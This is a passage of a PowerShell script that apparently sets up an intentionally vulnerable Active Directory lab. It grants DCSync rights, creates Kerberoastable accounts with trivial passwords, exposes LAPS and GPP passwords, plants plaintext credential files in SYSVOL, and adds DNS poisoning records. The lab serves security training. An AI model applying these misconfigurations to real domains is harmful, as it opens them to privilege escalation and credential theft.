    Grant DCSync rights to regular users (dangerous!)
#>
function Grant-DCSync {
  try {
    Write-Log "Granting DCSync rights to regular user..." -Level INFO

    $user = "admin.backup"  # One of the existing users
    $domainDN = (Get-ADDomain).DistinguishedName

    # Check if user exists
    if (Get-ADUser -Filter "Name -eq '$user'" -ErrorAction SilentlyContinue) {
      # Grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All using PowerShell
      $userSID = (Get-ADUser $user).SID
      $acl = Get-Acl "AD:$domainDN"

      # Add DCSync permissions
      $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", [System.Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2") # DS-Replication-Get-Changes
      $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", [System.Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") # DS-Replication-Get-Changes-All

      $acl.AddAccessRule($ace1)
      $acl.AddAccessRule($ace2)
      Set-Acl -Path "AD:$domainDN" -AclObject $acl

      Write-Log "Granted DCSync rights to user: $user" -Level INFO
    }
    else {
      Write-Log "User $user not found for DCSync rights" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error granting DCSync rights: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Create weak service accounts with SPNs for Kerberoasting
#>
function Set-WeakSPNs {
  try {
    Write-Log "Creating service accounts with weak SPNs..." -Level INFO

    # Check OS version for password compliance
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)

    # Create service accounts with very weak passwords and SPNs
    $services = @(
      @{Name = "mssql_svc"; SPN = "MSSQLSvc/sql.lab.local:1433"; Password = "sql" },
      @{Name = "http_svc"; SPN = "HTTP/web.lab.local"; Password = "web" },
      @{Name = "ftp_svc"; SPN = "FTP/ftp.lab.local"; Password = "ftp" },
      @{Name = "oracle_svc"; SPN = "ORACLE/db.lab.local:1521"; Password = "oracle" }
    )

    foreach ($service in $services) {
      try {
        if (-not (Get-ADUser -Filter "Name -eq '$($service.Name)'" -ErrorAction SilentlyContinue)) {
          # Make password Server 2025 compliant but still weak
          $servicePassword = $service.Password
          if ($isServer2025OrNewer -and $servicePassword.Length -lt 3) {
            $servicePassword = $servicePassword + "123"  # Make it at least 3 chars
          }

          New-ADUser -Name $service.Name -AccountPassword (ConvertTo-SecureString $servicePassword -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -ServicePrincipalNames @($service.SPN) -ErrorAction Stop

          Write-Log "Created service account: $($service.Name) with SPN: $($service.SPN)" -Level INFO
        }
        else {
          Write-Log "Service account already exists: $($service.Name)" -Level WARNING
        }
      }
      catch {
        Write-Log "Error creating service account $($service.Name): $($_.Exception.Message)" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting up weak SPNs: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure LAPS bypass scenarios
#>
function Set-LAPSBypass {
  try {
    Write-Log "Setting up LAPS bypass vulnerabilities..." -Level INFO

    # Create scenario where LAPS passwords are readable by domain users
    # This simulates misconfigured LAPS permissions
    $computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd -ResultSetSize 3
    foreach ($computer in $computers) {
      try {
        $acl = Get-Acl "AD:$($computer.DistinguishedName)"
        $sid = (Get-ADGroup "Domain Users").SID
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ReadProperty", "Allow", [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None, [System.Guid]"ms-Mcs-AdmPwd")
        $acl.AddAccessRule($ace)
        Set-Acl -Path "AD:$($computer.DistinguishedName)" -AclObject $acl

        Write-Log "Configured LAPS bypass on: $($computer.Name)" -Level INFO
      }
      catch {
        Write-Log "Warning: Could not configure LAPS bypass on $($computer.Name): $_" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting up LAPS bypass: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure weak certificate template ACLs
#>
function Set-WeakCertTemplateACLs {
  try {
    Write-Log "Setting weak certificate template ACLs..." -Level INFO

    # Grant Enroll permissions to Domain Users on vulnerable templates
    $templates = @('VulnerableUserESC1', 'VulnerableUserESC2')
    $configNamingContext = (Get-ADRootDSE).ConfigurationNamingContext

    foreach ($template in $templates) {
      try {
        $templateDN = "CN=$template,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNamingContext"

        # Check if template exists
        if (Get-ADObject -Filter "Name -eq '$template'" -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNamingContext" -ErrorAction SilentlyContinue) {
          $acl = Get-Acl "AD:$templateDN"
          $domainUsersSID = (Get-ADGroup "Domain Users").SID

          # Grant Domain Users enroll permissions
          $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($domainUsersSID, "ExtendedRight", "Allow", [System.Guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55") # Certificate-Enrollment
          $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($domainUsersSID, "ExtendedRight", "Allow", [System.Guid]"a05b8cc2-17bc-4802-a710-e7c15ab866a2") # Certificate-AutoEnrollment

          $acl.AddAccessRule($ace1)
          $acl.AddAccessRule($ace2)
          Set-Acl -Path "AD:$templateDN" -AclObject $acl

          Write-Log "Set weak ACLs on certificate template: $template" -Level INFO
        }
      }
      catch {
        Write-Log "Warning: Could not set ACLs on template $template : $_" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting weak certificate template ACLs: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Create additional privileged groups and misconfigurations
#>
function Set-PrivilegedGroupMisconfigs {
  try {
    Write-Log "Setting up privileged group misconfigurations..." -Level INFO

    # Add users to sensitive groups
    $privilegedGroups = @(
      @{Group = "DNS Admins"; User = "john.doe" },
      @{Group = "Backup Operators"; User = "jane.smith" },
      @{Group = "Print Operators"; User = "guest.user" }
    )

    foreach ($config in $privilegedGroups) {
      try {
        # Check if group exists, create if not
        if (-not (Get-ADGroup -Filter "Name -eq '$($config.Group)'" -ErrorAction SilentlyContinue)) {
          New-ADGroup -Name $config.Group -GroupScope DomainLocal -ErrorAction Stop
        }

        # Add user to group if user exists
        if (Get-ADUser -Filter "Name -eq '$($config.User)'" -ErrorAction SilentlyContinue) {
          Add-ADGroupMember -Identity $config.Group -Members $config.User -ErrorAction Stop
          Write-Log "Added $($config.User) to $($config.Group)" -Level INFO
        }
      }
      catch {
        Write-Log "Warning: Could not configure $($config.Group): $_" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting privileged group misconfigurations: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Create user disclosure methods for modern Windows environments
#>
function Set-UserDisclosureMethods {
  try {
    Write-Log "Setting up user disclosure methods for modern Windows..." -Level INFO

    # Method 1: Create web-accessible user list
    $webUserList = "C:\inetpub\wwwroot\users.txt"
    $shareUserList = "C:\VulnerableShare\usernames_wordlist.txt"

    # Get all domain users (if AD is available)
    try {
      $domainUsers = Get-ADUser -Filter * -ErrorAction Stop | Select-Object -ExpandProperty SamAccountName
    }
    catch {
      $domainUsers = @()
      Write-Log "Could not enumerate AD users, using predefined lists" -Level WARNING
    }

    # Use existing username arrays from script configuration
    $allUsers = ($domainUsers + $Script:UserConfig.Usernames + $Script:UserConfig.WeakPasswordUsers.Name) | Sort-Object -Unique

    # Create user lists in multiple locations
    $allUsers | Out-File -FilePath $webUserList -Encoding ASCII -Force
    $allUsers | Out-File -FilePath $shareUserList -Encoding ASCII -Force

    # Set permissions for web access
    if (Test-Path $webUserList) {
      icacls $webUserList /grant "Everyone:(R)" /T
      Write-Log "Created web-accessible user list: $webUserList" -Level INFO
    }

    # Method 2: Enable SNMP with user enumeration
    try {
      # Install SNMP feature if not present
      $snmpFeature = Get-WindowsFeature -Name "SNMP-Service" -ErrorAction SilentlyContinue
      if ($snmpFeature -and $snmpFeature.InstallState -ne "Installed") {
        Install-WindowsFeature -Name "SNMP-Service" -IncludeManagementTools -ErrorAction SilentlyContinue -Verbose:$false
      }

      # Configure SNMP with weak community strings
      if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities") {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -Name "public" -Value 4 -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -Name "private" -Value 4 -Force
        Write-Log "SNMP configured with weak community strings" -Level INFO
      }
    }
    catch {
      Write-Log "Warning: Could not configure SNMP: $_" -Level WARNING
    }

    # Method 3: Create DNS records for user enumeration
    try {
      # Calculate IP range based on DC IP address
      $dcIP = [System.Net.IPAddress]::Parse($Script:NetworkConfig.IPAddress)
      $dcBytes = $dcIP.GetAddressBytes()

      # Generate IPs in the same subnet as the DC
      $baseIP = "$($dcBytes[0]).$($dcBytes[1]).$($dcBytes[2])"

      # Add DNS records that might reveal usernames using dynamic IP range
      $dnsRecords = @(
        @{Name = "admin-pc"; IP = "$baseIP.100" },
        @{Name = "john-laptop"; IP = "$baseIP.101" },
        @{Name = "jane-workstation"; IP = "$baseIP.102" },
        @{Name = "backup-server"; IP = "$baseIP.103" },
        @{Name = "sql-server"; IP = "$baseIP.104" },
        @{Name = "web-server"; IP = "$baseIP.105" },
        @{Name = "file-server"; IP = "$baseIP.106" },
        @{Name = "print-server"; IP = "$baseIP.107" }
      )

      foreach ($record in $dnsRecords) {
        try {
          Add-DnsServerResourceRecordA -Name $record.Name -ZoneName $Script:DomainConfig.DomainName -IPv4Address $record.IP -ErrorAction SilentlyContinue
        }
        catch {
          # Ignore DNS record creation errors
        }
      }
      Write-Log "Created DNS records for user enumeration" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not create DNS records: $_" -Level WARNING
    }

    # Method 4: Configure Kerberos for user enumeration
    try {
      # Ensure Kerberos pre-authentication is disabled for some users (already done in user creation)
      # This allows kerbrute to enumerate users effectively

      # Set domain policy to allow user enumeration via Kerberos
      $kerberosPolicy = @{
        "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" = @{
          "MaxTokenSize" = 65535
          "LogLevel"     = 1
        }
      }

      foreach ($path in $kerberosPolicy.Keys) {
        if (-not (Test-Path $path)) {
          New-Item -Path $path -Force | Out-Null
        }
        foreach ($setting in $kerberosPolicy[$path].GetEnumerator()) {
          Set-ItemProperty -Path $path -Name $setting.Key -Value $setting.Value -Force
        }
      }

      Write-Log "Kerberos configured for user enumeration" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not configure Kerberos settings: $_" -Level WARNING
    }

    # Method 5: Create user information in registry (for advanced enumeration)
    try {
      $userInfoPath = "HKLM:\SOFTWARE\VulnerableApp\Users"
      if (-not (Test-Path $userInfoPath)) {
        New-Item -Path $userInfoPath -Force | Out-Null
      }

      # Store some user information in registry
      Set-ItemProperty -Path $userInfoPath -Name "LastUser" -Value "john.doe" -Force
      Set-ItemProperty -Path $userInfoPath -Name "AdminUser" -Value "admin.backup" -Force
      Set-ItemProperty -Path $userInfoPath -Name "ServiceAccount" -Value "mssql_svc" -Force

      # Set weak permissions on registry key
      $acl = Get-Acl $userInfoPath
      $accessRule = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "ReadKey", "Allow")
      $acl.SetAccessRule($accessRule)
      Set-Acl -Path $userInfoPath -AclObject $acl

      Write-Log "Created registry-based user information" -Level INFO
    }
    catch {
      Write-Log "Warning: Could not create registry user information: $_" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error setting up user disclosure methods: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Write vulnerability summary
#>
function Write-VulnerabilitySummary {
  try {
    # Get domain information
    $domain = Get-ADDomain -ErrorAction SilentlyContinue
    $domainName = if ($domain) { $domain.DNSRoot } else { "lab.local" }

    # Count created accounts
    $labUsersOU = "OU=Lab Users,DC=lab,DC=local"
    $labUsers = @()
    $serviceAccounts = @()
    $privilegedAccounts = @()
    $machineAccounts = @()

    try {
      # Get users from Lab Users OU if it exists
      if (Get-ADOrganizationalUnit -Identity $labUsersOU -ErrorAction SilentlyContinue) {
        $labUsers = Get-ADUser -SearchBase $labUsersOU -Filter * -ErrorAction SilentlyContinue
      }

      # Get machine accounts
      $machineAccounts = Get-ADComputer -Filter "Name -like 'VULN-*'" -ErrorAction SilentlyContinue

      # Categorize users
      foreach ($user in $labUsers) {
        if ($user.Name -match "svc_|_svc$|service") {
          $serviceAccounts += $user
        }
        elseif ($user.Name -match "admin|operator|dns\.|backup\.") {
          $privilegedAccounts += $user
        }
      }
    }
    catch {
      Write-Log "Warning: Could not enumerate some accounts: $_" -Level WARNING
    }

    $summary = @"

╔══════════════════════════════════════════════════════════════════════════════╗
║                           🏴‍☠️  HACKLAB AD4 SUMMARY  🏴‍☠️                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

🌐 DOMAIN INFORMATION:
   Domain: $domainName
   NetBIOS: $($Script:DomainConfig.DomainNetbiosName)
   DC: $($Script:DomainConfig.DCName)
   IP: $($Script:NetworkConfig.IPAddress)

👥 USER ACCOUNTS CREATED:
   📁 Lab Users OU: OU=Lab Users,$($domain.DistinguishedName)

   🔓 Vulnerable Users ($($Script:UserConfig.WeakPasswordUsers.Count)):
$(foreach ($user in $Script:UserConfig.WeakPasswordUsers) { "      • $($user.Name) : $($user.Password) ($($user.Description))" })

   ⚙️  Service Accounts ($($serviceAccounts.Count)):
      • svc_sql : SQLService123 (Kerberoasting target)
      • svc_iis : IISService123 (Kerberoasting target)
      • svc_exchange : ExchangeService123 (Kerberoasting target)
      • svc_sharepoint : SharePointService123 (Kerberoasting target)
      • svc_backup : BackupService123 (Kerberoasting target)
      • svc_monitoring : MonitoringService123 (Kerberoasting target)
      • mssql_svc : sql (Weak SPN account)
      • http_svc : web (Weak SPN account)
      • ftp_svc : ftp (Weak SPN account)
      • oracle_svc : oracle (Weak SPN account)
      • constrained_svc : service (Constrained delegation)
      • unconstrained_svc : delegation (Unconstrained delegation)
      • asrep_user : asrep (AS-REP roastable)
      • delegation_user : delegation (Delegation account)

   🛡️  Privileged Accounts (3):
      • dns.admin : dns (DNS Admins group)
      • backup.operator : backup (Backup Operators group)
      • account.operator : account (Account Operators group)

   🎲 Random Users: Generated during script execution with weak passwords

🖥️  MACHINE ACCOUNTS ($($machineAccounts.Count + 2)):
      • VULN-PC01 (RBCD target computer)
      • DC01 (Domain Controller)

🏢 ORGANIZATIONAL UNITS:
      • OU=Lab Users (All vulnerable accounts)
      • OU=Workstations (Computer accounts)
      • OU=Servers (Server accounts)
      • OU=Service Accounts (Service accounts)

👥 SECURITY GROUPS:
      • Domain Admins (admin.backup member)
      • DNS Admins (dns.admin member)
      • Backup Operators (backup.operator member)
      • Account Operators (account.operator member)
      • Server_Admins (Custom group)
      • SQL_Admins (Custom group)
      • PrivAppAdmins (Custom group)

🎯 ATTACK VECTORS ENABLED:
✓ Weak Password Policies (No complexity, min length 1, no lockout)
✓ SMB Vulnerabilities (SMBv1 enabled, No signing, Null sessions)
✓ RDP Weaknesses (No NLA, Unencrypted connections)
✓ Kerberos Issues (No pre-auth, Weak encryption, RC4/DES enabled)
✓ LDAP Security (Signing/SSL disabled)
✓ LLMNR/NBT-NS Poisoning Enabled
✓ Unconstrained/Constrained Delegation Accounts
✓ Resource-Based Constrained Delegation (RBCD)
✓ AD CS Vulnerabilities (ESC1-ESC10 templates)
✓ Print Spooler Vulnerabilities (PrintNightmare)
✓ Shadow Credentials Attack Vectors
✓ DCSync Rights Misconfiguration
✓ Vulnerable Service Accounts (Kerberoasting)
✓ LAPS Bypass Scenarios
✓ Weak Certificate Template ACLs
✓ DNS Admin Group Privilege Escalation
✓ Machine Account Quota Exploitation (10 accounts)
✓ Backup Operators Group Privilege Escalation
✓ Account Operators Group Misuse
✓ Pre-Windows 2000 Compatible Access (Anonymous enumeration)
✓ ADIDNS Wildcard Record Poisoning
✓ SYSVOL/NETLOGON Sensitive File Exposure
✓ GPP Password Disclosure (cpassword)
✓ Advanced Certificate Vulnerabilities (ESC8-ESC10)
✓ Privileged Group Misconfigurations
✓ User Disclosure Methods (Web, SNMP, DNS, Registry)
✓ Vulnerable GPOs with Weak Permissions
✓ Weak Service/Scheduled Task Permissions
✓ WSUS HTTP Configuration
✓ Anonymous Enumeration Enabled
✓ Reversible Password Encryption
✓ Firewall, UAC, Windows Defender Disabled

📁 PASSWORD FILES CREATED:
   • Desktop: passwords.txt (All credentials)
   • Script Directory: passwords.txt
   • VulnerableShare: passwords.txt
   • Web Root: passwords.txt
   • Weak Passwords List: C:\VulnerableShare\weak_passwords.txt

🚨 IMPORTANT NOTES:
   • All accounts have PasswordNeverExpires = true
   • Password complexity is disabled
   • Account lockout is disabled
   • This is an intentionally vulnerable lab environment
   • DO NOT use in production environments

╔══════════════════════════════════════════════════════════════════════════════╗
║                    🎯 LAB ENVIRONMENT READY FOR TESTING 🎯                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@
    Write-Log $summary -Level SUCCESS
  }
  catch {
    Write-Log "Error generating vulnerability summary: $_" -Level ERROR
    # Fallback to basic summary
    $basicSummary = "\n=== HACKLAB AD4 SETUP COMPLETE ===\nDomain: $($Script:DomainConfig.DomainName)\nVulnerable lab environment configured successfully!\n==============================\n"
    Write-Log $basicSummary -Level SUCCESS
  }
}

<#
.SYNOPSIS
    Configures unconstrained delegation on service accounts
#>
function Set-UnconstrainedDelegation {
  try {
    $serviceAccount = "unconstrained_svc"
    $password = "delegation"

    # Create service account with unconstrained delegation
    New-ADUser -Name $serviceAccount `
      -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) `
      -Enabled $true `
      -PasswordNeverExpires $true `
      -ServicePrincipalNames @("HOST/$($env:COMPUTERNAME)") `
      -PassThru |
    Set-ADAccountControl -TrustedForDelegation $true

    Add-UserToTracking -Username $serviceAccount -Password $password -Description "Unconstrained delegation service account"
    Write-Log "Created unconstrained delegation account: $serviceAccount with password: $password" -Level INFO
    return $true
  }
  catch {
    Write-Log "Error setting up unconstrained delegation: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure DNS Admin group privilege escalation vulnerability
#>
function Set-DNSAdminVulnerability {
  try {
    Write-Log "Setting up DNS Admin privilege escalation vulnerability..." -Level INFO

    # Create DNS Admin user
    $dnsAdminUser = "dns.admin"
    $password = "dns"

    # Make password Server 2025 compliant but still weak
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)
    if ($isServer2025OrNewer -and $password.Length -lt 3) {
      $password = $password + "123"  # Make it at least 3 chars
    }

    $existingUser = Get-ADUser -Filter "Name -eq '$dnsAdminUser'" -ErrorAction SilentlyContinue
    if ($existingUser) {
      # Update existing DNS Admin user's password
      Set-ADAccountPassword -Identity $dnsAdminUser -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset -ErrorAction Stop
      Set-ADUser -Identity $dnsAdminUser -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
      Write-Log "Updated DNS Admin user: $dnsAdminUser with password: $password" -Level INFO
    }
    else {
      # Create new DNS Admin user
      $labUsersOU = Get-LabUsersOU
      New-ADUser -Name $dnsAdminUser `
        -SamAccountName $dnsAdminUser `
        -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) `
        -Description "DNS Administrator with DLL loading vulnerability" `
        -Path $labUsersOU `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -CannotChangePassword $true `
        -ErrorAction Stop
      Write-Log "Created DNS Admin user: $dnsAdminUser with password: $password" -Level INFO
    }

    # Add to DNS Admins group (safe to run multiple times)
    Add-ADGroupMember -Identity "DnsAdmins" -Members $dnsAdminUser -ErrorAction SilentlyContinue
    Add-UserToTracking -Username $dnsAdminUser -Password $password -Description "DNS Admin with DLL loading vulnerability" -Groups @("DnsAdmins")

    # Create vulnerable DLL loading scenario
    $dllPath = "C:\VulnerableShare\evil.dll"
    if (-not (Test-Path $dllPath)) {
      # Create a sample DLL file (placeholder)
      "This is a placeholder for a malicious DLL that could be loaded by DNS service" | Out-File -FilePath $dllPath -Force
      icacls $dllPath /grant "Everyone:(F)" /T 2>$null
    }

    return $true
  }
  catch {
    Write-Log "Error setting up DNS Admin vulnerability: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Machine Account Quota exploitation
#>
function Set-MachineAccountQuota {
  try {
    Write-Log "Configuring Machine Account Quota vulnerability..." -Level INFO

    # Ensure machine account quota is set to default (10)
    $domain = Get-ADDomain
    Set-ADDomain -Identity $domain -Replace @{"ms-DS-MachineAccountQuota" = "10" } -ErrorAction Stop

    Write-Log "Machine Account Quota set to 10 (allows domain users to create computer accounts)" -Level INFO
    return $true
  }
  catch {
    Write-Log "Error configuring Machine Account Quota: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Backup Operators group privilege escalation
#>
function Set-BackupOperatorsVulnerability {
  try {
    Write-Log "Setting up Backup Operators privilege escalation..." -Level INFO

    # Create Backup Operators user
    $backupUser = "backup.operator"
    $password = "backup"

    # Make password Server 2025 compliant but still weak
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)
    if ($isServer2025OrNewer -and $password.Length -lt 3) {
      $password = $password + "123"  # Make it at least 3 chars
    }

    $existingUser = Get-ADUser -Filter "Name -eq '$backupUser'" -ErrorAction SilentlyContinue
    if ($existingUser) {
      # Update existing Backup Operator user's password
      Set-ADAccountPassword -Identity $backupUser -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset -ErrorAction Stop
      Set-ADUser -Identity $backupUser -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
      Write-Log "Updated Backup Operator user: $backupUser with password: $password" -Level INFO
    }
    else {
      # Create new Backup Operator user
      $labUsersOU = Get-LabUsersOU
      New-ADUser -Name $backupUser `
        -SamAccountName $backupUser `
        -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) `
        -Description "Backup Operator with SeBackupPrivilege" `
        -Path $labUsersOU `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -CannotChangePassword $true `
        -ErrorAction Stop
      Write-Log "Created Backup Operator user: $backupUser with password: $password" -Level INFO
    }

    # Add to Backup Operators group (safe to run multiple times)
    Add-ADGroupMember -Identity "Backup Operators" -Members $backupUser -ErrorAction SilentlyContinue
    Add-UserToTracking -Username $backupUser -Password $password -Description "Backup Operator with SeBackupPrivilege" -Groups @("Backup Operators")

    return $true
  }
  catch {
    Write-Log "Error setting up Backup Operators vulnerability: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Account Operators group misuse
#>
function Set-AccountOperatorsVulnerability {
  try {
    Write-Log "Setting up Account Operators group misuse..." -Level INFO

    # Create Account Operators user
    $accountUser = "account.operator"
    $password = "account"

    # Make password Server 2025 compliant but still weak
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)
    if ($isServer2025OrNewer -and $password.Length -lt 3) {
      $password = $password + "123"  # Make it at least 3 chars
    }

    $existingUser = Get-ADUser -Filter "Name -eq '$accountUser'" -ErrorAction SilentlyContinue
    if ($existingUser) {
      # Update existing Account Operator user's password
      Set-ADAccountPassword -Identity $accountUser -NewPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Reset -ErrorAction Stop
      Set-ADUser -Identity $accountUser -Enabled $true -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction SilentlyContinue
      Write-Log "Updated Account Operator user: $accountUser with password: $password" -Level INFO
    }
    else {
      # Create new Account Operator user
      $labUsersOU = Get-LabUsersOU
      New-ADUser -Name $accountUser `
        -SamAccountName $accountUser `
        -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) `
        -Description "Account Operator with user/group management rights" `
        -Path $labUsersOU `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -CannotChangePassword $true `
        -ErrorAction Stop
      Write-Log "Created Account Operator user: $accountUser with password: $password" -Level INFO
    }

    # Add to Account Operators group (safe to run multiple times)
    Add-ADGroupMember -Identity "Account Operators" -Members $accountUser -ErrorAction SilentlyContinue
    Add-UserToTracking -Username $accountUser -Password $password -Description "Account Operator with user/group management rights" -Groups @("Account Operators")

    return $true
  }
  catch {
    Write-Log "Error setting up Account Operators vulnerability: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Pre-Windows 2000 Compatible Access group vulnerability
#>
function Set-PreWin2000CompatibleAccess {
  try {
    Write-Log "Configuring Pre-Windows 2000 Compatible Access vulnerability..." -Level INFO

    # Add Everyone to Pre-Windows 2000 Compatible Access group
    $everyoneSid = [System.Security.Principal.SecurityIdentifier]::new('S-1-1-0')
    $preWin2000Group = Get-ADGroup -Filter "Name -eq 'Pre-Windows 2000 Compatible Access'" -ErrorAction SilentlyContinue

    if ($preWin2000Group) {
      try {
        Add-ADGroupMember -Identity $preWin2000Group -Members $everyoneSid -ErrorAction Stop
        Write-Log "Added Everyone to Pre-Windows 2000 Compatible Access group (enables anonymous enumeration)" -Level INFO
      }
      catch {
        Write-Log "Everyone may already be in Pre-Windows 2000 Compatible Access group" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error configuring Pre-Windows 2000 Compatible Access: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure ADIDNS wildcard record poisoning
#>
function Set-ADIDNSPoisoning {
  try {
    Write-Log "Setting up ADIDNS wildcard record poisoning..." -Level INFO

    # Create wildcard DNS records for common services
    $wildcardRecords = @(
      @{Name = "*"; Target = "169.254.0.100"; Description = "Wildcard record for traffic interception" },
      @{Name = "wpad"; Target = "169.254.0.101"; Description = "WPAD poisoning record" },
      @{Name = "proxy"; Target = "169.254.0.102"; Description = "Proxy poisoning record" },
      @{Name = "mail"; Target = "169.254.0.103"; Description = "Mail server poisoning" },
      @{Name = "ftp"; Target = "169.254.0.104"; Description = "FTP server poisoning" }
    )

    foreach ($record in $wildcardRecords) {
      try {
        Add-DnsServerResourceRecordA -Name $record.Name -ZoneName $Script:DomainConfig.DomainName -IPv4Address $record.Target -ErrorAction SilentlyContinue
        Write-Log "Created DNS record: $($record.Name) -> $($record.Target) ($($record.Description))" -Level INFO
      }
      catch {
        Write-Log "DNS record $($record.Name) may already exist" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting up ADIDNS poisoning: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure SYSVOL/NETLOGON share vulnerabilities
#>
function Set-SYSVOLVulnerabilities {
  try {
    Write-Log "Setting up SYSVOL/NETLOGON share vulnerabilities..." -Level INFO

    # Get SYSVOL path
    $sysvolPath = "$env:SystemRoot\SYSVOL\domain\scripts"
    if (-not (Test-Path $sysvolPath)) {
      New-Item -Path $sysvolPath -ItemType Directory -Force | Out-Null
    }

    # Create sensitive files in SYSVOL
    $sensitiveFiles = @(
      @{Name = "backup_script.bat"; Content = "@echo off`nnet use Z: \\fileserver\backup /user:backup.admin P@ssw0rd123!`nrobocopy C:\ImportantData Z:\ /MIR" },
      @{Name = "config.xml"; Content = "<?xml version='1.0'?><config><database><server>sql01</server><username>sa</username><password>SqlAdmin123!</password></database></config>" },
      @{Name = "credentials.txt"; Content = "Service Account Credentials:`nservice.account:ServicePass123!`nbackup.service:BackupPass456!`nadmin.service:AdminPass789!" },
      @{Name = "install.ps1"; Content = "# Installation script`n$cred = New-Object PSCredential('admin', (ConvertTo-SecureString 'AdminPassword123!' -AsPlainText -Force))`nInvoke-Command -ComputerName server01 -Credential $cred -ScriptBlock { Install-Software }" }
    )

    foreach ($file in $sensitiveFiles) {
      $filePath = Join-Path $sysvolPath $file.Name
      $file.Content | Out-File -FilePath $filePath -Force
      icacls $filePath /grant "Everyone:(R)" /T 2>$null
      Write-Log "Created sensitive file in SYSVOL: $($file.Name)" -Level INFO
    }

    # Create GPP-style files with encrypted passwords (cpassword)
    $gppContent = @"
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="LocalAdmin" image="2">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" userName="LocalAdmin"/>
  </User>
</Groups>
"@

    $gppPath = Join-Path $sysvolPath "Groups.xml"
    $gppContent | Out-File -FilePath $gppPath -Force
    icacls $gppPath /grant "Everyone:(R)" /T 2>$null
    Write-Log "Created GPP file with cpassword in SYSVOL: Groups.xml" -Level INFO

    return $true
  }
  catch {
    Write-Log "Error setting up SYSVOL vulnerabilities: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure advanced certificate template vulnerabilities (ESC8-ESC10)
#>
function Set-AdvancedCertificateVulnerabilities {
  try {
    Write-Log "Setting up advanced certificate template vulnerabilities (ESC8-ESC10)..." -Level INFO

    # ESC8: NTLM Relay to AD CS HTTP Endpoints
    try {
      # Configure IIS for certificate enrollment with NTLM authentication
      Import-Module WebAdministration -ErrorAction SilentlyContinue -Verbose:$false

